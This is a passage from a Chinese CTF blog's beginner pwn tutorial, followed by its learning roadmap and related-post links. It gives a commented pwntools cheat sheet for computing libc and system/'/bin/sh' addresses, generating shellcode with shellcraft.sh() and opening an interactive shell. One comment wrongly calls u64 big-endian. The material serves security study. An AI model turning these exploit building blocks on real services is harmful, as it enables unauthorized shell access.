-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#3-pwntools%e7%9a%84%e5%9f%ba%e6%9c%ac%e4%bd%bf%e7%94%a8" style="text-decoration-line: none !important;">#</a></span>
-</h3>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># python3</span>
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># 导入python库</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x01 环境设置</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 1</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span> <span class="c1"># 在对漏洞进行故障排除</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'i386'</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 2</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 3</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn_name</span> <span class="c1"># 从二进制文件推断目标架构、位与和字节序</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x02 建立链接</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span> <span class="c1"># 创建与ip:port的链接</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">pwn_name</span><span class="p">)</span> <span class="c1"># 执行二进制文件process</span>
-</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="c1"># 在当前进程下调试二进制文件</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x03 利用elf文件</span>
-</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">pwn_name</span><span class="p">)</span> <span class="c1"># 封装有关 ELF 文件的信息</span>
-</span></span><span class="line"><span class="cl"><span class="n">func_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"func"</span><span class="p">]</span> <span class="c1"># 在ELF文件中查找函数的加载地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">func_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">"func"</span><span class="p">]</span> <span class="c1"># 在ELF文件中查找函数的got表地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">func_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">"func"</span><span class="p">]</span> <span class="c1"># 在ELF文件中查找函数的plt表地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh'</span><span class="p">)</span><span class="o">.</span><span class="n">__next</span><span class="p">()</span><span class="n">__</span> <span class="c1"># 在ELF文件中查找字符串</span>
-</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"/bin/sh"</span><span class="p">))</span> <span class="c1"># 这个写法也可以</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x04 利用本地libc文件</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc-2.23.so'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_real_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">"/bin/sh"</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># binsh_addr = libc_base + next(libc.search(b"/bin/sh"))</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 这个写法也可以</span>
-</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x05 查找libc文件</span>
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">'puts'</span><span class="p">,</span> <span class="n">puts_real_addr</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_real_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">'puts'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'libc_base '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">"system"</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">"str_bin_sh"</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x06 生成shellcode</span>
-</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()</span> <span class="c1"># 生成指定架构的shellcode 汇编语言</span>
-</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1"># 转换为字节</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x07 接收发送字节</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="c1"># 接收 size 个字节 默认全部接收</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># 接收字节直至遇到b'\n'</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="c1"># 接受字节直到遇到 string</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="c1"># 发送 data</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="c1"># 发送 data 在后面加 b'\n'</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="c1"># 在接收 string 后发送data</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="n">data</span><span class="p">)</span> <span class="c1"># 在接收 string 后发送data 在后面加 '\n'</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">p64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="c1"># 将 data 转换为64位小端序字节 也可以为32/16/8位字节</span>
-</span></span><span class="line"><span class="cl"><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="c1"># 将 data 转换为64位大端序字节 也可以为32/16/8位字节</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">### 0x08 创建一个交互shell</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> 
-</span></span></code></pre></div><p>还可以看看：</p>
-<p><a href="https://docs.pwntools.com/en/stable/" target="_blank">
-    pwntools — pwntools 4.10.0 documentation</a></p>
-<br/>
-<hr/>
-<div class="anchor" id="4-学习路线"></div>
-<h3 class="relative group">4. 学习路线 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#4-%e5%ad%a6%e4%b9%a0%e8%b7%af%e7%ba%bf" style="text-decoration-line: none !important;">#</a></span>
-</h3>
-<p>最后再放一张学习pwn的路线图，来源于华科的 <a href="https://blog.csdn.net/qq_54218833?type=blog" target="_blank">
-    C0lin</a> 师傅：</p>
-<p><a href="https://hornos3.github.io/2023/02/28/ARM-pwn-%e5%85%a5%e9%97%a8-1/pwn%e5%ad%a6%e4%b9%a0%e8%b7%af%e7%ba%bf.png" target="_blank">
-<strong>pwn学习路线图</strong></a></p>
-<p>同学们可以按照图中的<strong>绿色→黄色→红色</strong>的顺序学习pwn</p>
-<br/>
-<p>还可以继续往下阅读学习本系列的文章：</p>
-<hr/>
-<section class="space-y-10 w-full">
-<a class="flex flex-wrap article border border-neutral-200 dark:border-neutral-700 border-2 rounded-md backdrop-blur" href="/posts/pwn/basic/pwn-_environment/">
-<div class="w-full md:w-auto h-full thumbnail nozoom" style="background-image:url(/posts/pwn/basic/pwn-_environment/featured.jpg);"></div>
-<div class="p-4">
-<div class="items-center text-xl font-semibold">
-<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/basic/pwn-_environment/">PWN环境二次搭建记录-Ubuntu 22.04</div>
-</div>
-<div class="text-sm text-neutral-500 dark:text-neutral-400">
-<div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-07-10 00:00:00 +0000 UTC">July 10, 2023</time><span class="px-2 text-primary-500">·</span><span>9775 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">20 分钟</span>
-</div>
-<div class="flex flex-row flex-wrap items-center">
-<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    pwn入门
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    PWN
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ubuntu/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Ubuntu
-  </span>
-</span>
-</span>
-</div>
-</div>
-</div>
-</a>
-</section>
-<hr/>
-<section class="space-y-10 w-full">
-<a class="flex flex-wrap article border border-neutral-200 dark:border-neutral-700 border-2 rounded-md backdrop-blur" href="/posts/pwn/basic/linux_/">
-<div class="p-4">
-<div class="items-center text-xl font-semibold">
-<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/basic/linux_/">Linux命令入门与总结</div>
-</div>
-<div class="text-sm text-neutral-500 dark:text-neutral-400">
-<div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-07-14 00:00:00 +0000 UTC">July 14, 2023</time><span class="px-2 text-primary-500">·</span><span>4854 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">10 分钟</span>
-</div>
-<div class="flex flex-row flex-wrap items-center">
-<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    pwn入门
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    PWN
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ubuntu/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Ubuntu
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/linux/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Linux
-  </span>
-</span>
-</span>
-</div>
-</div>
-</div>
-</a>
-</section>
-<hr/>
-<br/>
-<div class="anchor" id="5参考链接"></div>
-<h3 class="relative group">5.参考链接 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#5%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" style="text-decoration-line: none !important;">#</a></span>
-</h3>
-<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/" target="_blank">
-    栈溢出原理 - CTF Wiki (ctf-wiki.org)</a></p>
-<details class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" style="margin-left:0px">
-<summary class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
-        PWN入门 - This article is part of a series.
-    </summary>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<a href="https://ta0lve.github.io/posts/pwn/basic/tutorial2/">
-            Part 0: CTF入门宣讲-PWN方向
-        </a>
-</div>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Part 0: This Article
-    </div>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<a href="https://ta0lve.github.io/posts/pwn/basic/pwn-_environment/">
-            Part 1: PWN环境二次搭建记录-Ubuntu 22.04
-        </a>
-</div>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<a href="https://ta0lve.github.io/posts/pwn/basic/linux_/">
-            Part 2: Linux命令入门与总结
-        </a>
-</div>
-</details>
-</div>
-<script>
-        var oid = "views_posts\\pwn\\basic\\tutorial1\\index.md"
-        var oid_likes = "likes_posts\\pwn\\basic\\tutorial1\\index.md"
-      </script>
-<script integrity="sha512-DkmXO0rQo4LHxgEti/+CJjFmQtqrxPiiBHe9CGdPPabi+pk7wgrU9R58W7aOb5E6IHp8T+N+oOe4BolK/OCmTg==" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" type="text/javascript"></script>
-</section>
-<footer class="pt-8 max-w-prose print:hidden">
-<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
-<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
-<a class="min-w-full" href="/posts/pwn/basic/tutorial2/">
-<div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
-<div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/pwn/basic/tutorial2/featured.jpg);"></div>
-<div class="px-6 py-4">
-<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/basic/tutorial2/">CTF入门宣讲-PWN方向</div>
-<div class="text-sm text-neutral-500 dark:text-neutral-400">
-<div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-09-23 00:00:00 +0000 UTC">September 23, 2023</time><span class="px-2 text-primary-500">·</span><span>8419 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">17 分钟</span>
-</div>
-<div class="flex flex-row flex-wrap items-center">
-<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    pwn入门
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    PWN
-  </span>
-</span>
-</span>
-</div>
-</div>
-<div class="py-1 prose dark:prose-invert">
-<p>写给学弟学妹的pwn入门宣讲~</p>
-</div>
-</div>
-<div class="px-6 pt-4 pb-2">
-</div>
-</div>
-</a>
-<a class="min-w-full" href="/posts/pwn/basic/linux_/">
-<div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
-<div class="px-6 py-4">
-<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/basic/linux_/">Linux命令入门与总结</div>
-<div class="text-sm text-neutral-500 dark:text-neutral-400">
-<div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-07-14 00:00:00 +0000 UTC">July 14, 2023</time><span class="px-2 text-primary-500">·</span><span>4854 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">10 分钟</span>
-</div>
-<div class="flex flex-row flex-wrap items-center">
-<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    pwn入门
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    PWN
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ubuntu/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Ubuntu
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/linux/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Linux
-  </span>
-</span>
-</span>
-</div>
-</div>
-</div>
-<div class="px-6 pt-4 pb-2">
-</div>
-</div>
-</a>
-<a class="min-w-full" href="/posts/pwn/basic/pwn-_environment/">
-<div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
-<div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/pwn/basic/pwn-_environment/featured.jpg);"></div>
-<div class="px-6 py-4">
-<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/basic/pwn-_environment/">PWN环境二次搭建记录-Ubuntu 22.04</div>
-<div class="text-sm text-neutral-500 dark:text-neutral-400">
-<div class="flex flex-row flex-wrap items-center">
-<time datetime="2023-07-10 00:00:00 +0000 UTC">July 10, 2023</time><span class="px-2 text-primary-500">·</span><span>9775 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">20 分钟</span>
-</div>
-<div class="flex flex-row flex-wrap items-center">
-<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%85%A5%E9%97%A8/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    pwn入门
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CTF
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    PWN
-  </span>
-</span>
-</span>
-<span class="mr-2" onclick="window.open(&quot;/tags/ubuntu/&quot;,'_self');" style="margin-top:0.5rem">
-<span class="flex">
-<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Ubuntu
-  </span>
-</span>
-</span>
-</div>
-</div>
-</div>
-<div class="px-6 pt-4 pb-2">
-</div>
-</div>
-</a>
-</section>
-<div class="content" id="content">
-<div style="margin-top:2em;padding:0 0.5em;font-size:.875rem">
-<hr/>
-<br/>
-<div style="padding-bottom:1em;">
-<p> </p>
-<p>本文作者：<a href="https://ta0lve.github.io/about/" target="_blank"><font color="#49b1f5" style="text-decoration: underline">ta0lve</font></a></p>
-<p>本文链接：<a href="https://ta0lve.github.io/posts/pwn/basic/tutorial1/" target="_blank"><font color="#49b1f5" style="text-decoration: underline">pwn入门教程</font></a></p>
-<p><a href="https://ta0lve.github.io/posts/pwn/basic/tutorial1/" target="_blank"><font color="#49b1f5" style="text-decoration: underline"> https://ta0lve.github.io/posts/pwn/basic/tutorial1/ </font></a></p>
-<p>版权声明：本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank"><font color="#49b1f5" style="text-decoration: underline"> CC BY-NC 4.0 </font></a> 许可协议。</p>
-<p>转载请注明来自<a class="redlink" href="https://ta0lve.github.io/" target="_blank"> <font color="#49b1f5" style="text-decoration: underline">ta0lve's Blog</font></a> ！</p>
-</div>
-</div>
-</div>
-<div class="pt-8">
-<hr class="border-dotted border-neutral-300 dark:border-neutral-600"/>
-<div class="flex justify-between pt-3">
-<span>
-<a class="flex group mr-3" href="/posts/pwn/heap/chunk_1/">
-<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">←</span>
-<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">→</span>
-<span class="flex flex-col">
-<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">堆基础知识学习记录</span>
-<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-<time datetime="2023-07-31 00:00:00 +0000 UTC">July 31, 2023</time>
-</span>
-</span>
-</a>
-</span>
-<span>
-<a class="flex text-right group ml-3" href="/posts/sth/redis/1/">
-<span class="flex flex-col">
-<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Redis学习记录</span>
-<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-<time datetime="2023-08-07 00:00:00 +0000 UTC">August 7, 2023</time>
-</span>
-</span>
-<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">→</span>
-<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">←</span>
-</a>
-</span>
-</div>
-</div>
-<script async="" crossorigin="anonymous" data-category="Announcements" data-category-id="DIC_kwDOJ9Vlo84CX_0P" data-emit-metadata="0" data-input-position="bottom" data-lang="zh-CN" data-mapping="pathname" data-reactions-enabled="1" data-repo="ta0lve/blogtalk" data-repo-id="R_kgDOJ9Vlow" data-strict="0" data-theme="dark_dimmed" src="https://giscus.app/client.js">
-</script>
-</footer>
-</article>
-<div class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0" id="top-scroller">
-<a aria-label="" class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" href="#the-top" title="">
-    ↑
-  </a>
-</div>
-</main><footer class="py-10 print:hidden" id="site-footer">
-<nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
-<ul class="flex flex-col list-none sm:flex-row">
-<li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
-<a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/about/" title="About">About</a>
-</li>
-<li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
-<a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/tags/pwn/" title="PWN">pwn2own , pwn4fun</a>
-</li>
-</ul>
-</nav>
-<div class="flex items-center justify-between">
-<p class="text-sm text-neutral-500 dark:text-neutral-400">
-      Copyright ©2024 ta0lve, All Rights Reserved.
